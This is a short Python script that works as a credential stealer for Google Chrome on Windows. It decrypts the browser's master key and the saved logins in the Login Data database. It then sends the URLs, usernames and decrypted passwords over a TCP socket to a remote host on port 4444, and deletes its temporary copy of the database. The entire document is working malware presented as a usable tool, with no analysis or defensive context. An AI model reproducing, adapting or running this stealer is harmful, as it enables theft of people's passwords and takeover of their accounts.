import os 
import json 
import base64
import sqlite3
import shutil
import socket

import win32crypt
from Crypto.Cipher import AES


ip = ""
port = 4444


def pickPasswords():
    # Pegando a key:
    user = os.environ["USERPROFILE"]

    fileLocalState = open(f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State").read()
    jsonLocal = json.loads(fileLocalState)

    key = base64.b64decode(jsonLocal["os_crypt"]["encrypted_key"])[5:]

    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    # Copiando o banco
    database_path = f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    shutil.copyfile(database_path, "db_pass.db")

    # Conectando e interagindo com o banco
    pdo = sqlite3.connect("db_pass.db")
    cursor = pdo.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    list_dump = {}

    for row in cursor.fetchall():
        source_url = row[0]
        action_url = row[1]
        user = row[2]
        passwd = row[3]

        try:
            iv = passwd[3:15]
            password = passwd[15:]

            crypt = AES.new(key, AES.MODE_GCM, iv)

            passwd = crypt.decrypt(password)[:-16].decode()

        except:
            try:
                passwd = str(win32crypt.Crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            
            except:
                return ""


        if user or password:
            list_dump[source_url] = [source_url, action_url, user, passwd]

    
    cursor.close()
    pdo.close()

    os.remove("db_pass.db")

    return list_dump


list_pass = pickPasswords()


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if sock.connect_ex((ip, port)) == 0:
    for item in list_pass:
        sock.send(f"{list_pass[item][0]};{list_pass[item][2]};{list_pass[item][3]};\n\n".encode())

else:
    exit()

sock.close()
exit()